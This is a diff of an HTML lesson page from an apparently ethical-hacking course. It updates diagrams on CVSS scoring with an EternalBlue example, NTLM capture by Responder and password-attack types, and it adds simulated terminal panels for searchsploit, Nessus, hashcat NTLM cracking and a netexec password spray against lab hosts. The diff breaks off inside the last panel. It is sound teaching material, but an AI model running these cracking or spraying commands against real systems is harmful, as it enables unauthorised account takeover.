@@ -439,38 +439,43 @@ which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchspl
          use it right now.</p>
 
       <figure class="dgm">
-        <svg viewBox="0 0 940 320" role="img" aria-label="CVSS v3.1 base metrics — exploitability metrics and impact metrics combine into a score and a severity band, shown with the EternalBlue example vector.">
-          <text class="d-title" x="20" y="26" font-size="13">CVSS v3.1 base vector — the eight base metrics</text>
-          <!-- exploitability group -->
-          <rect x="16" y="44" width="440" height="150" rx="10" fill="#1a1f2a" stroke="#ff7043"/>
-          <text x="36" y="68" font-size="12" fill="#ff7043" class="d-mono">EXPLOITABILITY — can they reach it?</text>
-          <rect x="36" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="82" y="100" text-anchor="middle" font-size="11">AV</text><text class="d-sub" x="82" y="116" text-anchor="middle">Attack Vector</text>
-          <rect x="140" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="186" y="100" text-anchor="middle" font-size="11">AC</text><text class="d-sub" x="186" y="116" text-anchor="middle">Attack Complexity</text>
-          <rect x="244" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="290" y="100" text-anchor="middle" font-size="11">PR</text><text class="d-sub" x="290" y="116" text-anchor="middle">Privileges Req.</text>
-          <rect x="348" y="80" width="92" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="394" y="100" text-anchor="middle" font-size="11">UI</text><text class="d-sub" x="394" y="116" text-anchor="middle">User Interaction</text>
-          <text class="d-sub" x="36" y="150">S — Scope: does it break out of its security boundary?</text>
-          <rect x="36" y="158" width="120" height="26" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="96" y="175" text-anchor="middle" font-size="11">S · Scope</text>
-          <!-- impact group -->
-          <rect x="484" y="44" width="300" height="150" rx="10" fill="#1a1f2a" stroke="#e63946"/>
-          <text x="504" y="68" font-size="12" fill="#e63946" class="d-mono">IMPACT — what they get</text>
-          <rect x="504" y="80" width="80" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="544" y="100" text-anchor="middle" font-size="11">C</text><text class="d-sub" x="544" y="116" text-anchor="middle">Confidentiality</text>
-          <rect x="596" y="80" width="80" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="636" y="100" text-anchor="middle" font-size="11">I</text><text class="d-sub" x="636" y="116" text-anchor="middle">Integrity</text>
-          <rect x="688" y="80" width="80" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="728" y="100" text-anchor="middle" font-size="11">A</text><text class="d-sub" x="728" y="116" text-anchor="middle">Availability</text>
-          <text class="d-sub" x="504" y="150">Each: None / Low / High</text>
-          <!-- score -->
-          <rect x="812" y="70" width="112" height="98" rx="10" fill="#1f2533" stroke="#fbbf24"/>
-          <text class="d-title" x="868" y="104" text-anchor="middle" font-size="22" fill="#fbbf24">8.1</text>
-          <text class="d-sub" x="868" y="126" text-anchor="middle">HIGH</text>
-          <text class="d-sub" x="868" y="146" text-anchor="middle">0–10 · banded</text>
-          <path d="M784,119 L810,119" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
-          <path d="M456,119 L482,119" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
-          <!-- worked example vector -->
-          <text class="d-mono d-lbl" x="20" y="228" font-size="12">Worked example — EternalBlue (CVE-2017-0144, MS17-010, on your Win7 target):</text>
-          <rect x="20" y="240" width="904" height="30" rx="6" fill="#0d1218" stroke="#252b38"/>
-          <text class="d-mono" x="34" y="260" font-size="12.5" fill="#c9d1d9">CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H  →  8.1 HIGH</text>
-          <text class="d-sub" x="20" y="292">Read it: network-reachable (AV:N), no privileges or user click needed (PR:N/UI:N), full C/I/A loss. The AC:H (needs</text>
-          <text class="d-sub" x="20" y="308">a heap-grooming trick) is the only thing holding it under 9 — and Metasploit does that trick for you. A must-fix.</text>
-        </svg>
+        <svg viewBox="0 0 1560 470" role="img" aria-label="CVSS v3.1 base metrics: exploitability and impact groups combine into a 0-10 score and a severity band, with the EternalBlue example.">
+  <text class="d-title" x="30" y="34" font-size="21">CVSS v3.1 base vector — eight metrics become one score</text>
+  <!-- exploitability -->
+  <rect x="30" y="58" width="720" height="212" rx="12" fill="#1a1f2a" stroke="#ff7043"></rect>
+  <text class="d-mono" x="52" y="92" font-size="17" fill="#ff7043">EXPLOITABILITY — can they reach it?</text>
+  <g font-size="15">
+    <rect x="52" y="108" width="160" height="92" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-title" x="132" y="150" text-anchor="middle" font-size="26">AV</text><text class="d-lbl" x="132" y="178" text-anchor="middle" font-size="15" style="fill:var(--text-3)">Attack Vector</text>
+    <rect x="226" y="108" width="160" height="92" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-title" x="306" y="150" text-anchor="middle" font-size="26">AC</text><text class="d-lbl" x="306" y="178" text-anchor="middle" font-size="15" style="fill:var(--text-3)">Attack Complexity</text>
+    <rect x="400" y="108" width="160" height="92" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-title" x="480" y="150" text-anchor="middle" font-size="26">PR</text><text class="d-lbl" x="480" y="178" text-anchor="middle" font-size="15" style="fill:var(--text-3)">Privileges Req.</text>
+    <rect x="574" y="108" width="160" height="92" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-title" x="654" y="150" text-anchor="middle" font-size="26">UI</text><text class="d-lbl" x="654" y="178" text-anchor="middle" font-size="15" style="fill:var(--text-3)">User Interaction</text>
+  </g>
+  <rect x="52" y="214" width="682" height="42" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="72" y="240" font-size="15"><tspan class="d-title" font-size="15">S · Scope</tspan>  —  does the exploit break out of its security boundary?</text>
+  <!-- plus -->
+  <text x="762" y="172" text-anchor="middle" font-size="30" fill="#768290">+</text>
+  <!-- impact -->
+  <rect x="778" y="58" width="430" height="212" rx="12" fill="#1a1f2a" stroke="#e63946"></rect>
+  <text class="d-mono" x="800" y="92" font-size="17" fill="#e63946">IMPACT — what they get</text>
+  <g font-size="15">
+    <rect x="800" y="108" width="122" height="92" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-title" x="861" y="150" text-anchor="middle" font-size="26">C</text><text class="d-lbl" x="861" y="178" text-anchor="middle" font-size="15" style="fill:var(--text-3)">Confidentiality</text>
+    <rect x="932" y="108" width="122" height="92" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-title" x="993" y="150" text-anchor="middle" font-size="26">I</text><text class="d-lbl" x="993" y="178" text-anchor="middle" font-size="15" style="fill:var(--text-3)">Integrity</text>
+    <rect x="1064" y="108" width="122" height="92" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-title" x="1125" y="150" text-anchor="middle" font-size="26">A</text><text class="d-lbl" x="1125" y="178" text-anchor="middle" font-size="15" style="fill:var(--text-3)">Availability</text>
+  </g>
+  <text class="d-lbl" x="800" y="238" font-size="15" style="fill:var(--text-3)">Each rated None / Low / High</text>
+  <!-- arrow to score -->
+  <path d="M1210,164 L1286,164" fill="none" stroke="#768290" stroke-width="2" marker-end="url(#ar-g)"></path>
+  <!-- score chip -->
+  <rect x="1292" y="92" width="240" height="150" rx="12" fill="#1f2533" stroke="#fbbf24"></rect>
+  <text class="d-title" x="1412" y="158" text-anchor="middle" font-size="52" fill="#fbbf24">8.1</text>
+  <text class="d-title" x="1412" y="192" text-anchor="middle" font-size="20" fill="#fbbf24">HIGH</text>
+  <text class="d-lbl" x="1412" y="220" text-anchor="middle" font-size="14" style="fill:var(--text-3)">0–10 · banded</text>
+  <!-- worked example -->
+  <text class="d-mono" x="30" y="322" font-size="16" fill="#fff">Worked example — EternalBlue (CVE-2017-0144 · MS17-010 · your Win7 target)</text>
+  <rect x="30" y="336" width="1502" height="46" rx="8" fill="#0d1218" stroke="#252b38"></rect>
+  <text class="d-mono" x="50" y="365" font-size="18" fill="#c9d1d9">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H  →  8.1  HIGH</text>
+  <text class="d-lbl" x="30" y="414" font-size="15" style="fill:var(--text-3)">Network-reachable (AV:N), no privileges or user click (PR:N / UI:N), full C/I/A loss. Only AC:H (a heap-grooming</text>
+  <text class="d-lbl" x="30" y="438" font-size="15" style="fill:var(--text-3)">trick) holds it under 9 — and Metasploit does that trick for you. Read the vector, not just the number.</text>
+</svg>
         <figcaption><b>The vector is the actionable part.</b> Two vulns can both score 8.1; the one with <span class="mono">AV:N/PR:N/UI:N</span> is the one you reach from your Kali box without touching the victim's keyboard.</figcaption>
       </figure>
 
@@ -530,6 +535,22 @@ which hashcat john hydra nxc responder impacket-GetUserSPNs evil-winrm searchspl
         <div class="dgm-detail" data-detail="ss"><h5><span class="dd-tag">SILENT</span>Research is invisible</h5><p><b>searchsploit reads a local copy of Exploit-DB.</b> No packet leaves your box, so nothing is logged anywhere — you can research a target's every version all day and the defender never knows. This is why detection can't start until you touch the target.</p></div>
         <div class="dgm-detail" data-detail="nv"><h5><span class="dd-tag">LOUD</span>Asking the target is an event</h5><p><b>nmap --script vuln sends real, often malformed probes.</b> The service logs the connections (WFP 5156, service logs) and IDS rules fire on the known script signatures. The instant "is this known?" becomes "is <em>this host</em> vulnerable?", it's detectable — map it to T1595 Active Scanning.</p></div>
       </figure>
+      <div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">searchsploit</span></div>
+  <div class="sim-body">
+<span class="l cmd">searchsploit apache tomcat 8.5</span>
+<span class="l dim">------------------------------------------ ----------------------------------</span>
+<span class="l dim"> Exploit Title                             |  Path</span>
+<span class="l dim">------------------------------------------ ----------------------------------</span>
+<span class="l"> Apache Tomcat 8.5 - AJP 'Ghostcat' File   | <span class="info">multiple/webapps/48143.py</span></span>
+<span class="l"> Apache Tomcat &lt; 9.0.31 - Local Priv Esc   | <span class="info">linux/local/49408.sh</span></span>
+<span class="l dim">------------------------------------------ ----------------------------------</span>
+<span class="l dim">Shellcodes: No Results</span>
+<span class="l cmd">searchsploit -m 48143         # copy the PoC into your working dir</span>
+<span class="l ok">  Copied to: /home/kali/48143.py</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">↻ Replay</button><span class="sim-note"><b>Offline &amp; silent</b> — a local Exploit-DB copy. The target never sees it.</span></div>
+</div>
 
       <h2 class="mono" style="color:#ff7043"><span class="h-t">searchsploit — the 7-part frame</span></h2>
       <div class="tbl-scroll">
@@ -784,6 +805,16 @@ searchsploit samba 2.2         # → trans2open remote overflow
           <pre><code># Nessus:   New Scan → Basic Network Scan → 192.168.56.102,107,20,10 → Launch
 # Greenbone: Scans → Tasks → New Task → target the same four → Start
 # Metasploitable2 lights up red; Win10 comes back nearly clean (it's patched)</code></pre>
+      <div class="sim sim-gui">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">Nessus Essentials — scan: WIN7-TGT01 (10.10.0.25)</span><span class="sim-tool">vuln scan</span></div>
+  <div class="sim-body">
+    <div class="sim-row"><span class="sim-sev crit">Critical</span><span class="sim-find">MS17-010 — EternalBlue SMBv1 remote code execution</span><span class="sim-cve">CVE-2017-0144</span></div>
+    <div class="sim-row"><span class="sim-sev high">High</span><span class="sim-find">SMB signing not required — relay possible</span><span class="sim-cve">—</span></div>
+    <div class="sim-row"><span class="sim-sev med">Medium</span><span class="sim-find">TLS 1.0 supported (BEAST)</span><span class="sim-cve">CVE-2011-3389</span></div>
+    <div class="sim-row"><span class="sim-sev low">Info</span><span class="sim-find">Nessus scan information</span><span class="sim-cve">—</span></div>
+  </div>
+  <div class="sim-cta"><span class="sim-note"><b>Confirm before you trust it</b> — cross-check each critical against your own version work.</span></div>
+</div>
           <div class="verify">
             <h4>✓ Verification — you can read the result</h4>
             <ul>
@@ -934,33 +965,34 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
          travels — because that's what Responder captures.</p>
 
       <figure class="dgm animate-run">
-        <svg viewBox="0 0 940 330" role="img" aria-label="NTLM challenge-response: client negotiates, server sends a challenge, client returns a response computed from its NT hash; the attacker who answers the client's name lookup captures that response, called NetNTLMv2, not the NT hash itself.">
-          <!-- actors -->
-          <rect x="40" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#22d3ee"/>
-          <text class="d-title" x="115" y="64" text-anchor="middle" font-size="12.5">Client</text>
-          <text class="d-sub" x="115" y="82" text-anchor="middle">has the NT hash</text>
-          <rect x="750" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#4ade80"/>
-          <text class="d-title" x="825" y="64" text-anchor="middle" font-size="12.5">Server / DC</text>
-          <text class="d-sub" x="825" y="82" text-anchor="middle">knows the hash too</text>
-          <!-- lifelines -->
-          <line x1="115" y1="92" x2="115" y2="250" stroke="#333b4c" stroke-width="1.2"/>
-          <line x1="825" y1="92" x2="825" y2="250" stroke="#333b4c" stroke-width="1.2"/>
-          <!-- messages -->
-          <path class="flow-line" d="M118,120 L822,120" fill="none" stroke="#a0aab6" stroke-width="1.8" marker-end="url(#ar-g)"/>
-          <text class="d-lbl d-mono" x="470" y="113" text-anchor="middle" font-size="11">1 · NEGOTIATE  “I want to authenticate”</text>
-          <path class="flow-line" d="M822,158 L118,158" fill="none" stroke="#4ade80" stroke-width="1.8" marker-end="url(#ar-grn)"/>
-          <text class="d-lbl d-mono" x="470" y="151" text-anchor="middle" font-size="11">2 · CHALLENGE  (a random nonce)</text>
-          <path class="flow-line" d="M118,196 L822,196" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"/>
-          <text class="d-lbl d-mono" x="470" y="189" text-anchor="middle" font-size="11" fill="#ff7043">3 · RESPONSE = f(NT hash, challenge)  ← this is NetNTLMv2</text>
-          <!-- key annotation -->
-          <rect x="250" y="216" width="440" height="30" rx="6" fill="#0d1218" stroke="#ff7043"/>
-          <text class="d-mono" x="470" y="235" text-anchor="middle" font-size="11" fill="#ff7043">the NT hash itself NEVER crosses the wire — only this keyed response does</text>
-          <!-- attacker inserts -->
-          <rect x="360" y="272" width="220" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
-          <text class="d-title" x="470" y="293" text-anchor="middle" font-size="12" fill="#ff7043">Attacker (Responder)</text>
-          <text class="d-sub" x="470" y="310" text-anchor="middle">answers the client's name lookup → receives step 3</text>
-          <path class="flow-line" d="M300,200 C320,240 380,262 430,270" fill="none" stroke="#ff7043" stroke-width="1.6" stroke-dasharray="4 4" marker-end="url(#ar-o)"/>
-        </svg>
+        <svg viewBox="0 0 1560 440" role="img" aria-label="NTLM challenge-response sequence between client and server; an attacker running Responder answers the client and receives the response, which is the NetNTLMv2 artefact, not the NT hash.">
+  <!-- actors -->
+  <rect x="60" y="30" width="360" height="64" rx="9" fill="#1f2533" stroke="#22d3ee"></rect>
+  <text class="d-title" x="240" y="60" text-anchor="middle" font-size="18">Client</text>
+  <text class="d-lbl" x="240" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">holds the NT hash</text>
+  <rect x="1140" y="30" width="360" height="64" rx="9" fill="#1f2533" stroke="#4ade80"></rect>
+  <text class="d-title" x="1320" y="60" text-anchor="middle" font-size="18">Server / DC</text>
+  <text class="d-lbl" x="1320" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">knows the hash too</text>
+  <!-- lifelines -->
+  <line x1="240" y1="94" x2="240" y2="300" stroke="#333b4c" stroke-width="1.4"></line>
+  <line x1="1320" y1="94" x2="1320" y2="300" stroke="#333b4c" stroke-width="1.4"></line>
+  <!-- messages: label ABOVE, arrow below -->
+  <text class="d-mono" x="780" y="140" text-anchor="middle" font-size="15" fill="#a0aab6">1 · NEGOTIATE — “I want to authenticate”</text>
+  <path class="flow-line" d="M244,152 L1316,152" fill="none" stroke="#a0aab6" stroke-width="1.8" marker-end="url(#ar-g)"></path>
+  <text class="d-mono" x="780" y="196" text-anchor="middle" font-size="15" fill="#4ade80">2 · CHALLENGE — a random nonce</text>
+  <path class="flow-line" d="M1316,208 L244,208" fill="none" stroke="#4ade80" stroke-width="1.8" marker-end="url(#ar-grn)"></path>
+  <text class="d-mono" x="780" y="252" text-anchor="middle" font-size="15" fill="#ff7043">3 · RESPONSE = f(NT hash, challenge)  →  this is NetNTLMv2</text>
+  <path class="flow-line" d="M244,264 L1316,264" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"></path>
+  <!-- attacker box lower-left, arrow drops in the clear left area -->
+  <path class="flow-line" d="M244,268 L244,344" fill="none" stroke="#ff7043" stroke-width="1.8" stroke-dasharray="5 4" marker-end="url(#ar-o)"></path>
+  <rect x="60" y="346" width="420" height="72" rx="9" fill="#1a1f2a" stroke="#ff7043"></rect>
+  <text class="d-title" x="270" y="376" text-anchor="middle" font-size="16" fill="#ff7043">Attacker (Responder)</text>
+  <text class="d-lbl" x="270" y="400" text-anchor="middle" font-size="14" style="fill:var(--text-3)">answers the name lookup → receives step 3</text>
+  <!-- note band right, no arrow crosses it -->
+  <rect x="560" y="352" width="940" height="60" rx="9" fill="#0d1218" stroke="#ff7043"></rect>
+  <text class="d-mono" x="1030" y="380" text-anchor="middle" font-size="15" fill="#ff7043">The NT hash NEVER crosses the wire —</text>
+  <text class="d-lbl" x="1030" y="401" text-anchor="middle" font-size="14" style="fill:var(--text-2)">Responder captures only the keyed NetNTLMv2 response → crack with hashcat -m 5600</text>
+</svg>
         <button type="button" class="dgm-replay" data-replay>↻ Replay the exchange</button>
         <figcaption><b>Responder captures the response, not the hash.</b> What you crack (mode <span class="mono">5600</span>)
            is the <span class="mono">NetNTLMv2</span> keyed response — recover the password offline and you have the account.
@@ -1078,58 +1110,46 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
       </div>
 
       <figure class="dgm interactive">
-        <svg viewBox="0 0 940 300" role="img" aria-label="Password attacks split into online attacks against a live login and offline attacks against a stolen hash; a separate branch, pass-the-hash, skips cracking entirely.">
-          <rect x="386" y="16" width="168" height="44" rx="9" fill="#1f2533" stroke="#e63946"/>
-          <text class="d-title" x="470" y="43" text-anchor="middle" font-size="13">Password attacks</text>
-          <!-- ONLINE -->
-          <g class="node" data-node="online" tabindex="0">
-            <rect x="70" y="96" width="170" height="44" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
-            <text class="d-title" x="155" y="123" text-anchor="middle" font-size="12.5" fill="#ff7043">ONLINE — the login</text>
-          </g>
-          <g class="node" data-node="spray" tabindex="0">
-            <rect x="30" y="176" width="118" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
-            <text class="d-lbl" x="89" y="201" text-anchor="middle" font-size="11.5">Spraying</text>
-          </g>
-          <rect x="158" y="176" width="118" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
-          <text class="d-lbl" x="217" y="201" text-anchor="middle" font-size="11.5">Brute-force</text>
-          <g class="node" data-node="credstuff" tabindex="0">
-            <rect x="70" y="228" width="170" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
-            <text class="d-lbl" x="155" y="253" text-anchor="middle" font-size="11.5">Credential stuffing</text>
-          </g>
-          <!-- OFFLINE -->
-          <g class="node" data-node="offline" tabindex="0">
-            <rect x="470" y="96" width="180" height="44" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
-            <text class="d-title" x="560" y="123" text-anchor="middle" font-size="12.5" fill="#ff7043">OFFLINE — a stolen hash</text>
-          </g>
-          <rect x="410" y="176" width="104" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
-          <text class="d-lbl" x="462" y="201" text-anchor="middle" font-size="11.5">Dictionary</text>
-          <g class="node" data-node="rules" tabindex="0">
-            <rect x="522" y="176" width="104" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
-            <text class="d-lbl" x="574" y="201" text-anchor="middle" font-size="11.5">Rule-based</text>
-          </g>
-          <g class="node" data-node="mask" tabindex="0">
-            <rect x="634" y="176" width="90" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
-            <text class="d-lbl" x="679" y="201" text-anchor="middle" font-size="11.5">Mask</text>
-          </g>
-          <rect x="466" y="228" width="120" height="40" rx="7" fill="#1f2533" stroke="#333b4c"/>
-          <text class="d-lbl" x="526" y="253" text-anchor="middle" font-size="11.5">Hybrid / rainbow</text>
-          <!-- PTH -->
-          <g class="node" data-node="pth" tabindex="0">
-            <rect x="762" y="150" width="160" height="60" rx="9" fill="#1a1f2a" stroke="#a78bfa"/>
-            <text class="d-title" x="842" y="175" text-anchor="middle" font-size="12" fill="#a78bfa">Pass-the-hash</text>
-            <text class="d-sub" x="842" y="194" text-anchor="middle">skip cracking entirely</text>
-          </g>
-          <!-- connectors -->
-          <path d="M420,60 C300,74 210,80 155,94" fill="none" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
-          <path d="M520,60 C580,74 570,82 560,94" fill="none" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
-          <path d="M120,140 L95,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
-          <path d="M170,140 L210,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
-          <path d="M150,140 L150,226" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
-          <path d="M520,140 L470,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
-          <path d="M560,140 L574,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
-          <path d="M600,140 L672,174" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
-          <path d="M554,44 C660,60 800,90 842,148" fill="none" stroke="#a78bfa" stroke-width="1.3" stroke-dasharray="4 4" marker-end="url(#ar-pu)"/>
-        </svg>
+        <svg viewBox="0 0 1560 380" role="img" aria-label="Password attacks split into online attacks on a live login and offline attacks on a stolen hash, with pass-the-hash as a shortcut that skips cracking.">
+  <rect x="630" y="20" width="300" height="58" rx="10" fill="#1f2533" stroke="#e63946"></rect>
+  <text class="d-title" x="780" y="56" text-anchor="middle" font-size="19">Password attacks</text>
+  <!-- bus -->
+  <path d="M780,78 L780,104" fill="none" stroke="#768290" stroke-width="1.6"></path>
+  <path d="M300,104 L1300,104" fill="none" stroke="#768290" stroke-width="1.6"></path>
+  <path d="M300,104 L300,128" fill="none" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"></path>
+  <path d="M780,104 L780,128" fill="none" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"></path>
+  <path d="M1300,104 L1300,128" fill="none" stroke="#a78bfa" stroke-width="1.6" stroke-dasharray="5 4" marker-end="url(#ar-pu)"></path>
+  <!-- ONLINE -->
+  <g class="node" data-node="online" tabindex="0">
+    <rect x="140" y="130" width="320" height="60" rx="9" fill="#1a1f2a" stroke="#ff7043"></rect>
+    <text class="d-title" x="300" y="166" text-anchor="middle" font-size="16" fill="#ff7043">ONLINE — the live login</text>
+  </g>
+  <g class="node" data-node="spray" tabindex="0"><rect x="140" y="230" width="150" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="215" y="261" text-anchor="middle" font-size="15">Spraying</text></g>
+  <rect x="310" y="230" width="150" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="385" y="261" text-anchor="middle" font-size="15">Brute-force</text>
+  <g class="node" data-node="credstuff" tabindex="0"><rect x="140" y="292" width="320" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="300" y="323" text-anchor="middle" font-size="15">Credential stuffing</text></g>
+  <path d="M300,192 L215,228" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
+  <path d="M300,192 L385,228" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
+  <path d="M300,282 L300,290" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
+  <!-- OFFLINE -->
+  <g class="node" data-node="offline" tabindex="0">
+    <rect x="600" y="130" width="360" height="60" rx="9" fill="#1a1f2a" stroke="#ff7043"></rect>
+    <text class="d-title" x="780" y="166" text-anchor="middle" font-size="16" fill="#ff7043">OFFLINE — a stolen hash</text>
+  </g>
+  <rect x="548" y="230" width="145" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="620" y="261" text-anchor="middle" font-size="15">Dictionary</text>
+  <g class="node" data-node="rules" tabindex="0"><rect x="708" y="230" width="145" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="780" y="261" text-anchor="middle" font-size="15">Rule-based</text></g>
+  <g class="node" data-node="mask" tabindex="0"><rect x="868" y="230" width="145" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="940" y="261" text-anchor="middle" font-size="15">Mask</text></g>
+  <rect x="548" y="292" width="465" height="50" rx="8" fill="#1f2533" stroke="#333b4c"></rect><text class="d-lbl" x="780" y="323" text-anchor="middle" font-size="15">Hybrid / rainbow tables</text>
+  <path d="M780,192 L620,228" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
+  <path d="M780,192 L780,228" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
+  <path d="M780,192 L940,228" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
+  <path d="M780,282 L780,290" fill="none" stroke="#768290" stroke-width="1.3" marker-end="url(#ar-g)"></path>
+  <!-- PTH -->
+  <g class="node" data-node="pth" tabindex="0">
+    <rect x="1120" y="130" width="360" height="86" rx="10" fill="#1a1f2a" stroke="#a78bfa"></rect>
+    <text class="d-title" x="1300" y="166" text-anchor="middle" font-size="16" fill="#a78bfa">Pass-the-hash</text>
+    <text class="d-lbl" x="1300" y="192" text-anchor="middle" font-size="14" style="fill:var(--text-3)">skip cracking — the hash IS the credential</text>
+  </g>
+</svg>
         <div class="dgm-hint">Click a node — when to use it, and its one constraint.</div>
         <div class="dgm-detail" data-detail="online"><h5><span class="dd-tag">ONLINE</span>Attacking the live login</h5><p><b>You send guesses at a running service</b> (SMB, RDP, SSH, a web form). Slow, and <em>noisy</em> — every attempt is logged, and a <strong>lockout policy</strong> will lock the account after N tries. Rate-limited and detectable. Tools: hydra, medusa, netexec.</p></div>
         <div class="dgm-detail" data-detail="spray"><h5><span class="dd-tag">ONLINE</span>Password spraying</h5><p><b>One password, tried against many accounts.</b> The inversion of brute-force: instead of many passwords vs one account (which trips lockout), try <span class="mono">Autumn2025!</span> against everyone — one attempt each stays under the threshold. The single most effective real-world domain attack. Lab 4.</p></div>
@@ -1300,6 +1320,22 @@ hashcat -m 1000 sam.txt --show      # → labuser:Summer2024 , helpdesk:Password
             <img src="assets/img/hashcat-crack.jpg" alt="hashcat finishing a mode 1000 NT-hash crack, showing Status: Cracked and recovered plaintext passwords">
             <figcaption>A real hashcat mode-1000 run finishing — <span class="mono">Status: Cracked</span>, <span class="mono">Recovered 4/4</span>, and the plaintext. <em>(Genuine hashcat run; the accounts and passwords are lab-only throwaways.)</em></figcaption>
           </figure>
+      <div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">hashcat 6.2.6</span></div>
+  <div class="sim-body">
+<span class="l cmd root">hashcat -m 1000 ntlm.hashes rockyou.txt -r best64.rule</span>
+<span class="l dim">hashcat (v6.2.6) starting... Device #1: NVIDIA RTX (CUDA)</span>
+<span class="l dim">Dictionary cache: rockyou.txt (14,344,385 words) + best64.rule</span>
+<span class="l info">Speed.#1.........:  8942.1 MH/s   Recovered: 3/4 (75%)</span>
+<span class="l">e19ccf75ee54e06b06a5907af13cef42:<span class="hl">Summer2026!</span></span>
+<span class="l">64f12cddaa88057e06a81b54e73b949b:<span class="hl">Password1</span></span>
+<span class="l dim">31d6cfe0d16ae931b73c59d7e0c089c0:            (blank / disabled account)</span>
+<span class="l ok">Status...........: Cracked</span>
+<span class="l cmd root">hashcat -m 1000 ntlm.hashes --show</span>
+<span class="l"><b>svc_backup</b>:<span class="hl">Summer2026!</span>   ← a service account, reused domain-wide</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">↻ Replay</button><span class="sim-note"><b>-m 1000</b> = NTLM (SAM). Wrong mode = silent failure.</span></div>
+</div>
           <div class="verify">
             <h4>✓ Verification</h4>
             <ul>
@@ -1405,6 +1441,19 @@ nxc smb 192.168.56.0/24 -u a.fahmy -p 'Autumn2025!'                          # w
         <figcaption><b>Invert the loop.</b> Brute-force is many-passwords-one-account (locks fast); spraying is
            one-password-many-accounts (slips under lockout). Same tool, opposite blast radius.</figcaption>
       </figure>
+      <div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">netexec smb</span></div>
+  <div class="sim-body">
+<span class="l cmd root">nxc smb dc.ceh.lab -u users.txt -p 'Autumn2025!' --continue-on-success</span>
+<span class="l dim">SMB  dc.ceh.lab  445  DC  [*] Windows Server 2019  (domain: ceh.lab)</span>
